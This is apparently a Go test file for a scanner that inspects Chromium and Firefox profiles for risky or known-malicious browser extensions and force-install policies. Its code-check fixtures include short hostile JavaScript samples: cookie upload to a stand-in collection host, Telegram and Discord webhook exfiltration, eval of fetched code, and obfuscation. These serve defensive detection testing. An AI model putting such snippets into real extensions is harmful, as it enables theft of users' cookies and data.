package main

import (
	"archive/zip"
	"bytes"
	"compress/gzip"
	"encoding/json"
	"io"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"testing"
	"time"
)

const (
	idStore     = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
	idUnpacked  = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
	idCmdLine   = "cccccccccccccccccccccccccccccccc"
	idEdgeStore = "dddddddddddddddddddddddddddddddd"
	idCustomUpd = "eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee"
	idComponent = "ffffffffffffffffffffffffffffffff"
	idDisabled  = "gggggggggggggggggggggggggggggggg"
	idProgram   = "hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh"
	idProgStore = "iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii"
)

func testDB(t *testing.T) *iocDB {
	t.Helper()
	db, err := loadIOC("")
	if err != nil {
		t.Fatal(err)
	}
	return db
}

// pickIOC returns an id from the built-in list with the wanted tier.
func pickIOC(t *testing.T, db *iocDB, weak bool) string {
	t.Helper()
	var ids []string
	for id, e := range db.entries {
		if e.Weak == weak {
			ids = append(ids, id)
		}
	}
	if len(ids) == 0 {
		t.Fatalf("no %v entries in the built-in list", weak)
	}
	sort.Strings(ids)
	return ids[0]
}

func writeJSON(t *testing.T, path string, v any) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	b, err := json.Marshal(v)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, b, 0o644); err != nil {
		t.Fatal(err)
	}
}

func writeFile(t *testing.T, path, text string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(text), 0o644); err != nil {
		t.Fatal(err)
	}
}

type fx map[string]any

// chromeFixture builds a Chromium "User Data" folder with one profile.
func chromeFixture(t *testing.T, bad, weak string) string {
	t.Helper()
	root := filepath.Join(t.TempDir(), "User Data")
	prof := filepath.Join(root, "Default")
	ext := filepath.Join(prof, "Extensions")
	writeJSON(t, filepath.Join(root, "Local State"), fx{"profile": fx{"info_cache": fx{"Default": fx{"name": "Tony"}}}})

	mf := func(id, ver string, m fx) string {
		rel := filepath.Join(id, ver)
		m["version"] = ver
		writeJSON(t, filepath.Join(ext, rel, "manifest.json"), m)
		return rel
	}
	broad := fx{"manifest_version": 3, "permissions": []string{"scripting", "storage"}, "host_permissions": []string{"<all_urls>"},
		"update_url": "https://clients2.google.com/service/update2/crx"}

	unpackedDir := filepath.Join(t.TempDir(), "dev-ext")
	writeJSON(t, filepath.Join(unpackedDir, "manifest.json"), fx{"name": "Dev Tool", "version": "0.1", "manifest_version": 3, "host_permissions": []string{"<all_urls>"}})

	settings := fx{
		idStore: fx{"location": 1, "from_webstore": true, "path": mf(idStore, "1.0", fx{"name": "__MSG_appName__", "default_locale": "en",
			"manifest_version": 3, "permissions": []string{"cookies"}, "host_permissions": []string{"<all_urls>"},
			"update_url": "https://clients2.google.com/service/update2/crx"}), "first_install_time": "13370000000000000"},
		idUnpacked:  fx{"location": 4, "path": unpackedDir},
		idCmdLine:   fx{"location": 8, "path": mf(idCmdLine, "2.0", fx{"name": "Loaded", "manifest_version": 3})},
		idEdgeStore: fx{"location": 1, "from_webstore": false, "path": mf(idEdgeStore, "3.0", fx{"name": "Edge Store", "manifest_version": 3, "update_url": "https://edge.microsoft.com/extensionwebstorebase/v1/crx"})},
		idCustomUpd: fx{"location": 1, "from_webstore": true, "path": mf(idCustomUpd, "1.0", fx{"name": "Custom Update", "manifest_version": 3, "update_url": "https://updates.example.net/ext.xml"})},
		idComponent: fx{"location": 5, "path": "C:/Program Files/Browser/resources/pdf"},
		idDisabled: fx{"location": 1, "from_webstore": true, "disable_reasons": []int{1},
			"path": mf(idDisabled, "1.0", fx{"name": "Off", "manifest_version": 3, "permissions": []string{"debugger"}, "update_url": "https://clients2.google.com/service/update2/crx"})},
		idProgram:   fx{"location": 6, "from_webstore": false, "path": mf(idProgram, "1.0", fx{"name": "Bundled", "manifest_version": 3, "host_permissions": []string{"<all_urls>"}})},
		idProgStore: fx{"location": 6, "from_webstore": false, "path": mf(idProgStore, "1.0", broad)},
		bad:         fx{"location": 1, "from_webstore": true, "path": mf(bad, "9.9", fx{"name": "Coupons Plus", "manifest_version": 3})},
		weak:        fx{"location": 1, "from_webstore": true, "path": mf(weak, "1.1", fx{"name": "Search Thing", "manifest_version": 3})},
		// a deleted extension leaves a stub like this behind
		"jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj": fx{"disable_reasons": []int{1}},
	}
	writeJSON(t, filepath.Join(ext, idStore, "1.0", "_locales", "en", "messages.json"), fx{"appName": fx{"message": "Price Helper"}})
	writeJSON(t, filepath.Join(prof, "Secure Preferences"), fx{"extensions": fx{"settings": settings}})
	writeJSON(t, filepath.Join(prof, "Preferences"), fx{"extensions": fx{}})
	return root
}

func byID(t *testing.T, exts []*Extension, id string) *Extension {
	t.Helper()
	for _, e := range exts {
		if e.ID == id {
			return e
		}
	}
	return nil
}

func rulesOf(fs []Finding, id string) map[string]severity {
	out := map[string]severity{}
	for _, f := range fs {
		if (f.Ext != nil && f.Ext.ID == id) || (f.Policy != nil && f.Policy.ID == id) {
			out[f.Rule] = f.Severity
		}
	}
	return out
}

func TestChromiumProfile(t *testing.T) {
	db := testDB(t)
	bad, weak := pickIOC(t, db, false), pickIOC(t, db, true)
	root := chromeFixture(t, bad, weak)

	profiles := profilesIn("Chrome", root, false)
	if len(profiles) != 1 || profiles[0].Name != "Default (Tony)" {
		t.Fatalf("profiles = %+v", profiles)
	}
	exts, err := readProfile(profiles[0])
	if err != nil {
		t.Fatal(err)
	}
	if byID(t, exts, idComponent) != nil {
		t.Error("component extensions should be skipped")
	}
	if byID(t, exts, "jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj") != nil {
		t.Error("stub settings entry should be skipped")
	}
	store := byID(t, exts, idStore)
	if store == nil || store.Name != "Price Helper" || store.Source != srcStore || !store.Enabled {
		t.Fatalf("store extension = %+v", store)
	}
	if store.Installed.IsZero() || store.Installed.Year() < 2020 {
		t.Errorf("install time not parsed: %v", store.Installed)
	}
	if got := byID(t, exts, idEdgeStore).Source; got != srcStore {
		t.Errorf("Edge store install source = %s, want store", got)
	}
	if got := byID(t, exts, idUnpacked); got == nil || got.Source != srcUnpacked || got.Name != "Dev Tool" {
		t.Errorf("unpacked = %+v", got)
	}
	if byID(t, exts, idDisabled).Enabled {
		t.Error("disabled extension reported as enabled")
	}

	var fs []Finding
	for _, e := range exts {
		fs = append(fs, checkExtension(e, db, true)...)
	}
	want := map[string]map[string]severity{
		idStore:     {"EXT010": low},
		idUnpacked:  {"EXT004": high},
		idCmdLine:   {"EXT002": high},
		idCustomUpd: {"EXT006": high},
		idProgram:   {"EXT005": high},
		idProgStore: {"EXT005": low, "EXT010": medium},
		bad:         {"EXT001": critical},
		weak:        {"EXT015": medium},
		idEdgeStore: {},
		idDisabled:  {},
	}
	for id, rules := range want {
		got := rulesOf(fs, id)
		if len(got) != len(rules) {
			t.Errorf("%s: got %v, want %v", id, got, rules)
			continue
		}
		for r, sev := range rules {
			if got[r] != sev {
				t.Errorf("%s: %s = %v, want %v", id, r, got[r], sev)
			}
		}
	}
}

func TestOnDiskOnlyFolder(t *testing.T) {
	db := testDB(t)
	bad := pickIOC(t, db, false)
	root := filepath.Join(t.TempDir(), "User Data")
	prof := filepath.Join(root, "Default")
	writeJSON(t, filepath.Join(prof, "Secure Preferences"), fx{"extensions": fx{"settings": fx{}}})
	writeJSON(t, filepath.Join(prof, "Extensions", bad, "1.0", "manifest.json"), fx{"name": "Dropped", "version": "1.0", "host_permissions": []string{"<all_urls>"}})
	writeJSON(t, filepath.Join(prof, "Extensions", idStore, "1.0", "manifest.json"), fx{"name": "Leftover", "version": "1.0"})

	exts, err := readProfile(Profile{Browser: "Chrome", Name: "Default", Path: prof})
	if err != nil {
		t.Fatal(err)
	}
	var fs []Finding
	for _, e := range exts {
		fs = append(fs, checkExtension(e, db, true)...)
	}
	if got := rulesOf(fs, bad); len(got) != 1 || got["EXT001"] != critical {
		t.Errorf("dropped bad id: %v", got)
	}
	if got := rulesOf(fs, idStore); len(got) != 0 {
		t.Errorf("leftover folder should not be reported: %v", got)
	}
}

func TestCodeChecks(t *testing.T) {
	db := testDB(t)
	mk := func(mv int, files map[string]string) *Extension {
		dir := t.TempDir()
		writeJSON(t, filepath.Join(dir, "manifest.json"), fx{"name": "x", "version": "1", "manifest_version": mv})
		for name, text := range files {
			writeFile(t, filepath.Join(dir, filepath.FromSlash(name)), text)
		}
		return &Extension{ID: idUnpacked, Name: "x", Dir: dir, Enabled: true, Source: srcStore, Manifest: mv}
	}
	token := "123456789" + ":" + strings.Repeat("A", 35)
	cases := []struct {
		name  string
		ext   *Extension
		rule  string
		found bool
	}{
		{"telegram exfil", mk(3, map[string]string{"bg.js": `fetch("https://api.telegram.org/bot` + token + `/sendMessage")`}), "EXT020", true},
		{"discord webhook", mk(3, map[string]string{"js/a.js": "const u='https://discord.com/api/webhooks/" + strings.Repeat("1", 18) + "/" + strings.Repeat("x", 40) + "'"}), "EXT020", true},
		{"mv2 eval of fetched code", mk(2, map[string]string{"bg.js": `fetch(u).then(r => r.text()).then(code => eval(code))`}), "EXT021", true},
		{"mv3 eval is blocked anyway", mk(3, map[string]string{"bg.js": `fetch(u).then(r => r.text()).then(code => eval(code))`}), "EXT021", false},
		{"eval of a literal", mk(2, map[string]string{"bg.js": `fetch(u); eval("1+1")`}), "EXT021", false},
		{"Function with literal args", mk(2, map[string]string{"bg.js": `fetch(u); new Function("exports", "env", lib); setTimeout(run, 50)`}), "EXT021", false},
		{"remote script tag", mk(2, map[string]string{"popup.html": `<script src="https://cdn.example.net/x.js"></script>`}), "EXT021", true},
		{"obfuscated", mk(3, map[string]string{"bg.js": strings.Repeat("var _0x1a2b=_0x3c4d[0x1];", 250)}), "EXT022", true},
		{"cookie upload", mk(3, map[string]string{"bg.js": `chrome.cookies.getAll({}, c => fetch("https://collect.example.net/c", {method:"POST", body: JSON.stringify(c)}))`}), "EXT023", true},
		{"cookies read locally", mk(3, map[string]string{"bg.js": `chrome.cookies.getAll({}, c => show(c))`}), "EXT023", false},
	}
	for _, c := range cases {
		hit := false
		for _, f := range checkExtension(c.ext, db, true) {
			if f.Rule == c.rule {
				hit = true
				if c.rule == "EXT020" && strings.Contains(f.Evidence, strings.Repeat("A", 20)) {
					t.Errorf("%s: token not redacted: %s", c.name, f.Evidence)
				}
			}
		}
		if hit != c.found {
			t.Errorf("%s: %s found=%v, want %v", c.name, c.rule, hit, c.found)
		}
	}
}

func TestFirefoxProfile(t *testing.T) {
	db := testDB(t)
	root := filepath.Join(t.TempDir(), "Profiles")
	prof := filepath.Join(root, "abcd.default-release")
	writeFile(t, filepath.Join(prof, "prefs.js"), "// prefs\n")

	xpi := filepath.Join(prof, "extensions", "helper@example.net.xpi")
	if err := os.MkdirAll(filepath.Dir(xpi), 0o755); err != nil {
		t.Fatal(err)
	}
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	w, _ := zw.Create("manifest.json")
	w.Write([]byte(`{"name":"Helper","version":"2.0","manifest_version":2,"permissions":["<all_urls>","webRequest","cookies"]}`))
	w, _ = zw.Create("bg.js")
	w.Write([]byte(`fetch(u).then(r=>r.text()).then(c=>eval(c))`))
	zw.Close()
	os.WriteFile(xpi, buf.Bytes(), 0o644)

	signed, unsigned := 2, 0
	writeJSON(t, filepath.Join(prof, "extensions.json"), fx{"addons": []fx{
		{"id": "ublock@example.org", "version": "1.0", "type": "extension", "active": true, "location": "app-profile",
			"sourceURI": "https://addons.mozilla.org/firefox/downloads/file/1/x.xpi", "signedState": signed,
			"defaultLocale": fx{"name": "Blocker"}, "userPermissions": fx{"permissions": []string{"webRequest"}, "origins": []string{"<all_urls>"}}},
		{"id": "helper@example.net", "version": "2.0", "type": "extension", "active": true, "location": "app-profile",
			"foreignInstall": true, "signedState": unsigned, "path": xpi},
		{"id": "temp@dev", "version": "0.1", "type": "extension", "active": true, "location": "app-temporary", "defaultLocale": fx{"name": "Temp"}},
		{"id": "builtin@mozilla.org", "version": "1", "type": "extension", "active": true, "location": "app-builtin"},
		{"id": "theme@example.org", "version": "1", "type": "theme", "active": true, "location": "app-profile"},
	}})

	if !isFirefoxDir(root) {
		t.Fatal("Firefox profiles folder not recognised")
	}
	profiles := profilesIn("Firefox", root, true)
	if len(profiles) != 1 {
		t.Fatalf("profiles = %+v", profiles)
	}
	exts, err := readProfile(profiles[0])
	if err != nil {
		t.Fatal(err)
	}
	if len(exts) != 3 {
		t.Fatalf("got %d extensions, want 3: %+v", len(exts), exts)
	}
	helper := byID(t, exts, "helper@example.net")
	if helper.Name != "Helper" || !hasBroadAccess(helper) {
		t.Errorf("xpi manifest not read: %+v", helper)
	}
	var fs []Finding
	for _, e := range exts {
		fs = append(fs, checkExtension(e, db, true)...)
	}
	if got := rulesOf(fs, "helper@example.net"); got["EXT007"] != high || got["EXT008"] != high || got["EXT021"] != high {
		t.Errorf("sideloaded unsigned add-on: %v", got)
	}
	if got := rulesOf(fs, "temp@dev"); got["EXT009"] != low {
		t.Errorf("temporary add-on: %v", got)
	}
	if got := rulesOf(fs, "ublock@example.org"); len(got) != 1 || got["EXT010"] != low {
		t.Errorf("store add-on: %v", got)
	}
}

func TestPolicies(t *testing.T) {
	db := testDB(t)
	bad := pickIOC(t, db, false)
	if id, url := parseForcelistEntry("  ABCDEFGHIJKLMNOPABCDEFGHIJKLMNOP;https://x.example/u.xml "); id != "abcdefghijklmnopabcdefghijklmnop" || url != "https://x.example/u.xml" {
		t.Errorf("parseForcelistEntry = %q %q", id, url)
	}
	raw := []byte(`{"ExtensionInstallForcelist":["` + idStore + `;https://clients2.google.com/service/update2/crx","` + idCustomUpd + `;http://evil.example/u.xml","not-an-id"],
		"ExtensionSettings":{"*":{"installation_mode":"blocked"},"` + bad + `":{"installation_mode":"force_installed","update_url":"https://clients2.google.com/service/update2/crx"}}}`)
	forced := policyJSON("Chrome", "/etc/opt/chrome/policies/managed/x.json", raw)
	if len(forced) != 3 {
		t.Fatalf("forced = %+v", forced)
	}
	fs := checkPolicies(forced, db)
	if got := rulesOf(fs, idStore)["EXT003"]; got != low {
		t.Errorf("store force install = %v, want low", got)
	}
	if got := rulesOf(fs, idCustomUpd)["EXT003"]; got != high {
		t.Errorf("custom server force install = %v, want high", got)
	}
	if got := rulesOf(fs, bad)["EXT003"]; got != critical {
		t.Errorf("known bad force install = %v, want critical", got)
	}
	for u, want := range map[string]bool{
		"": true, "https://clients2.google.com/service/update2/crx": true,
		"https://edge.microsoft.com/extensionwebstorebase/v1/crx": true,
		"https://clients2.google.com.evil.example/crx":            false,
		"http://update.example.net/x.xml":                         false,
	} {
		if officialUpdateURL(u) != want {
			t.Errorf("officialUpdateURL(%q) = %v", u, !want)
		}
	}
}

func TestIOCList(t *testing.T) {
	db := testDB(t)
	if n := len(db.entries); n < 5000 {
		t.Fatalf("built-in list has only %d ids", n)
	}
	extra := filepath.Join(t.TempDir(), "mine.txt")
	writeFile(t, extra, "# my list\n"+strings.ToUpper(idStore)+" Shady Helper\n\n")
	db2, err := loadIOC(extra)
	if err != nil {
		t.Fatal(err)
	}
	if e, ok := db2.lookup(idStore); !ok || e.Name != "Shady Helper" || e.Weak {
		t.Errorf("extra list entry = %+v %v", e, ok)
	}

	csvText := "\ufeff" + `"EXTID","EXTID-NAME","DATE-ADD","SOURCE","ARTICLE","ADD-SOURCES","CONFIRM-MAL","THREAT-TYPE","STILL-ACTIVE","TPCI-BEHAVIORAL"
"` + idStore + `","Search Box","2026-05-01","https://github.com/toborrm9/malicious_extension_sentry","","","1","browser-hijack","1",""
"` + idUnpacked + `","Wallet Drainer","2026-05-02","https://github.com/toborrm9/malicious_extension_sentry","","","1","data-theft","1",""
"` + idCmdLine + `","Removed One","2026-05-03","https://github.com/toborrm9/malicious_extension_sentry","","","1","adware","0",""
"` + idCustomUpd + `","Research","2026-05-04","https://example.org/report","https://example.org/report","","1","","1",""
"` + idProgram + `","Not confirmed","2026-05-05","https://example.org/x","","","0","","1",""
"not-an-id","x","","","","","1","","",""
`
	var out bytes.Buffer
	n, err := convertIOC(strings.NewReader(strings.Replace(csvText, "\ufeff", string(rune(0xFEFF)), 1)), &out)
	if err != nil || n != 4 {
		t.Fatalf("convertIOC = %d, %v", n, err)
	}
	db3 := &iocDB{entries: map[string]iocEntry{}}
	if _, err := db3.addTSV(bytes.NewReader(out.Bytes()), "test"); err != nil {
		t.Fatal(err)
	}
	for id, weak := range map[string]bool{idStore: true, idUnpacked: false, idCmdLine: false, idCustomUpd: false} {
		if e, ok := db3.lookup(id); !ok || e.Weak != weak {
			t.Errorf("%s: weak=%v ok=%v, want weak=%v", id, e.Weak, ok, weak)
		}
	}
	zr, _ := gzip.NewReader(bytes.NewReader(out.Bytes()))
	head, _ := io.ReadAll(zr)
	if !strings.Contains(string(head), "CC BY 4.0") {
		t.Error("attribution line missing from converted list")
	}
}

func TestRunJSONAndText(t *testing.T) {
	db := testDB(t)
	bad, weak := pickIOC(t, db, false), pickIOC(t, db, true)
	root := chromeFixture(t, bad, weak)

	var out, errb bytes.Buffer
	code := run([]string{"-json", "-all", root}, &out, &errb)
	if code != 1 {
		t.Fatalf("exit = %d, want 1 (stderr: %s)", code, errb.String())
	}
	var rep struct {
		Scanned  int `json:"extensions_scanned"`
		Findings []struct {
			Rule     string `json:"rule"`
			Severity string `json:"severity"`
		} `json:"findings"`
		Extensions []map[string]any `json:"extensions"`
	}
	if err := json.Unmarshal(out.Bytes(), &rep); err != nil {
		t.Fatal(err)
	}
	if rep.Scanned != 10 || len(rep.Extensions) != 10 {
		t.Errorf("scanned %d, listed %d, want 10", rep.Scanned, len(rep.Extensions))
	}
	if len(rep.Findings) == 0 || rep.Findings[0].Severity != "critical" {
		t.Errorf("findings not sorted by severity: %+v", rep.Findings)
	}

	out.Reset()
	if code := run([]string{"-min", "critical", "-lang", "tr", "-no-color", root}, &out, &errb); code != 1 {
		t.Errorf("exit = %d, want 1", code)
	}
	text := out.String()
	for _, want := range []string{"KRİTİK", "Coupons Plus", "Şimdi ne yapmalı", "Default (Tony)"} {
		if !strings.Contains(text, want) {
			t.Errorf("Turkish report misses %q:\n%s", want, text)
		}
	}
	if strings.Contains(text, "Price Helper") {
		t.Error("-min critical still shows a low finding")
	}
	for _, line := range strings.Split(text, "\n") {
		if visibleLen(line) > wrapWidth && !strings.Contains(line, "://") {
			t.Errorf("line longer than %d: %q", wrapWidth, line)
		}
	}

	if code := run([]string{filepath.Join(t.TempDir(), "missing")}, &out, &errb); code != 2 {
		t.Errorf("missing folder exit = %d, want 2", code)
	}
	if code := run([]string{"-min", "loud", root}, &out, &errb); code != 2 {
		t.Errorf("bad -min exit = %d, want 2", code)
	}
}

func TestCleanProfile(t *testing.T) {
	root := filepath.Join(t.TempDir(), "Opera Stable")
	writeJSON(t, filepath.Join(root, "Secure Preferences"), fx{"extensions": fx{"settings": fx{
		idStore: fx{"location": 1, "from_webstore": true, "path": filepath.Join(idStore, "1.0")},
	}}})
	writeJSON(t, filepath.Join(root, "Extensions", idStore, "1.0", "manifest.json"), fx{"name": "Notes", "version": "1.0", "manifest_version": 3, "permissions": []string{"storage"}})
	var out, errb bytes.Buffer
	if code := run([]string{"-lang", "en", "-no-color", root}, &out, &errb); code != 0 {
		t.Fatalf("exit = %d: %s %s", code, out.String(), errb.String())
	}
	if !strings.Contains(out.String(), "Nothing to report") {
		t.Errorf("clean report:\n%s", out.String())
	}
}

func TestChromeTime(t *testing.T) {
	// 2026-01-01T00:00:00Z in microseconds since 1601.
	want := time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC)
	us := (want.Unix() + 11644473600) * 1e6
	if got := chromeTime("", "x", itoa(us)); !got.Equal(want) {
		t.Errorf("chromeTime = %v, want %v", got, want)
	}
}

func itoa(n int64) string {
	b, _ := json.Marshal(n)
	return string(b)
}
